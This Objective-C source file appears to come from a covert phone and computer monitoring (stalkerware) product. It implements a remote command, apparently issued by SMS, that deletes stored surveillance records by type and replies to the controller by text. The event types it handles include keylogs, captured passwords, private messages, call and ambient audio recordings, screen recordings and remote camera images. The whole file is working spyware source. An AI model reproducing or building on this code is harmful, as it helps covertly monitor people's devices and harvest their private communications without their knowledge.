//
//  DeleteEventsProcessor.m
//  RCM
//
//  Created by Makara Khloth on 4/20/16.
//
//

#import "DeleteEventsProcessor.h"
#import "RemoteCmdUtils.h"
#import "EventTypeEnum.h"

@interface DeleteEventsProcessor (PrivateAPI)
- (void) processDeleteEvents;
- (void) sendReplySMS;
- (void) deleteEventsException;
@end

@implementation DeleteEventsProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the DeleteEventsProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (DeleteEventsProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"DeleteEventsProcessor--->initWithRemoteCommandData");
    if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
    }
    return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the DeleteEventsProcessor
 - Argument list and description:No Argument
 - Return description: No return type
 */

- (void) doProcessingCommand {
    DLog (@"DeleteEventsProcessor--->doProcessingCommand")
    [self processDeleteEvents];
}


#pragma mark DeleteEventsProcessor

/**
 - Method name: processDeleteEvents
 - Purpose:This method is used to Restart Devoce
 - Argument list and description: No Return Type
 - Return description: mRemoteCmdCode (NSString *)
 */

- (void) processDeleteEvents {
    DLog (@"DeleteEventsProcessor--->processDeleteEvents")
    NSArray *args = [mRemoteCmdData mArguments];
    NSUInteger phoenixEventType = UNKNOWN_EVENT;
    NSUInteger numberOfEvent = NSUIntegerMax;
    if (args.count > 2) {
        phoenixEventType = [[args objectAtIndex:2] integerValue];
        if (args.count > 3) {
            numberOfEvent = [[args objectAtIndex:3] integerValue];
        }
        DLog(@"phoenixEventType: %lu, numberOfEvent: %lu", (unsigned long)phoenixEventType, (unsigned long)numberOfEvent);
        
        FxEventType eventType = kEventTypeUnknown;
        switch (phoenixEventType) {
            case CALL_LOG:
                eventType = kEventTypeCallLog;
                break;
            case SMS:
                eventType = kEventTypeSms;
                break;
            case MAIL:
                eventType = kEventTypeMail;
                break;
            case MMS:
                eventType = kEventTypeMms;
                break;
            case CAMERA_IMAGE:
                eventType = kEventTypeCameraImage;
                break;
            case VIDEO_FILE:
                eventType = kEventTypeVideo;
                break;
            case WALLPAPER:
                eventType = kEventTypeWallpaper;
                break;
            case AUDIO_FILE:
                eventType = kEventTypeAudio;
                break;
            case SYSTEM:
                eventType = kEventTypeSystem;
                break;
            case AUDIO_CONVERSATION:
                eventType = kEventTypeCallRecordAudio;
                break;
            case IM:
                eventType = kEventTypeIM;
                break;
            case CAMERA_IMAGE_THUMBNAIL:
                eventType = kEventTypeCameraImageThumbnail;
                break;
            case AUDIO_FILE_THUMBNAIL:
                eventType = kEventTypeAudioThumbnail;
                break;
            case AUDIO_CONVERSATION_THUMBNAIL:
                eventType = kEventTypeCallRecordAudioThumbnail;
                break;
            case VIDEO_FILE_THUMBNAIL:
                eventType = kEventTypeVideoThumbnail;
                break;
            case ADDRESS_BOOK:
                eventType = kEventTypeAddressBook;
                break;
            case WALLPAPER_THUMBNAIL:
                eventType = kEventTypeWallpaperThumbnail;
                break;
            case PANIC_STATUS:
                eventType = kEventTypePanic;
                break;
            case PANIC_IMAGE:
                eventType = kEventTypePanicImage;
                break;
            case LOCATION:
                eventType = kEventTypeLocation;
                break;
            case SETTING:
                eventType = kEventTypeSettings;
                break;
            case BOOKMARK:
                eventType = kEventTypeBookmark;
                break;
            case BROWSER_URL:
                eventType = kEventTypeBrowserURL;
                break;
            case APPLICATION_LIFE_CYCLE:
                eventType = kEventTypeApplicationLifeCycle;
                break;
            case AUDIO_AMBIENT_RECORDING:
                eventType = kEventTypeAmbientRecordAudio;
                break;
            case AUDIO_AMBIENT_RECORDING_THUMBNAIL:
                eventType = kEventTypeAmbientRecordAudioThumbnail;
                break;
            case REMOTE_CAMERA_IMAGE:
                eventType = kEventTypeRemoteCameraImage;
                break;
            case IM_ACCOUNT:
                eventType = kEventTypeIMAccount;
                break;
            case IM_CONTACT:
                eventType = kEventTypeIMContact;
                break;
            case IM_CONVERSATION:
                eventType = kEventTypeIMConversation;
                break;
            case IM_MESSAGE:
                eventType = kEventTypeIMMessage;
                break;
            case KEY_LOG:
                eventType = kEventTypeKeyLog;
                break;
            case VOLIP:
                eventType = kEventTypeVoIP;
                break;
            case PAGE_VISITED:
                eventType = kEventTypePageVisited;
                break;
            case PASSWORD:
                eventType = kEventTypePassword;
                break;
            case PC_IM:
                eventType = kEventTypeIMMacOS;
                break;
            case USB:
                eventType = kEventTypeUsbConnection;
                break;
            case FILE_TRANSFER:
                eventType = kEventTypeFileTransfer;
                break;
            case PC_EMAIL:
                eventType = kEventTypeEmailMacOS;
                break;
            case APP_USAGE:
                eventType = kEventTypeAppUsage;
                break;
            case LOGON:
                eventType = kEventTypeLogon;
                break;
            case SCREEN_RECORDING:
                eventType = kEventTypeScreenRecordSnapshot;
                break;
            case NETWORK_CONNECTION:
                eventType = kEventTypeNetworkConnectionMacOS;
                break;
            case FILE_ACTIVITY:
                eventType = kEventTypeFileActivity;
                break;
            case NETWORK_TRAFFIC:
                eventType = kEventTypeNetworkTraffic;
                break;
            case PRINT_JOB:
                eventType = kEventTypePrintJob;
                break;
            case APP_SCREEN_SHOT:
                eventType = kEventTypeAppScreenShot;
                break;
            case VOIP_AUDIO_CONVERSATION:
                eventType = kEventTypeVoIPCallRecordAudio;
                break;
            default:
                break;
        }
        
        [[[RemoteCmdUtils sharedRemoteCmdUtils] mEventRepository] deleteEventType:eventType numberOfEvent:numberOfEvent];
        [self sendReplySMS];
    } else {
        [self deleteEventsException];
    }
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
 */

- (void) sendReplySMS {
    DLog (@"DeleteEventsProcessor--->sendReplySMS")
    NSString *deleteEventDatabaseMessage = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                                       andErrorCode:_SUCCESS_];
    deleteEventDatabaseMessage = [deleteEventDatabaseMessage stringByAppendingString:NSLocalizedString(@"kDeleteEvents", @"")];
    [[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
                                             andReplyMessage:deleteEventDatabaseMessage];
    if ([mRemoteCmdData mIsSMSReplyRequired]) {
        [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
                                                               andMessage:deleteEventDatabaseMessage];
    }
}

/**
 - Method name:			deleteEventsException
 - Purpose:				This method is invoked when delete events is failed to verify number of arguments.
 - Argument list and description: No Return Type
 - Return description:	No Argument
 */
- (void) deleteEventsException {
    DLog (@"DeleteEventsProcessor ---> deleteEventsException")
    FxException* exception = [FxException exceptionWithName:@"deleteEventsException" andReason:@"Delete Events error"];
    [exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
    [exception setErrorCategory:kFxErrorRCM];
    @throw exception;
}

@end
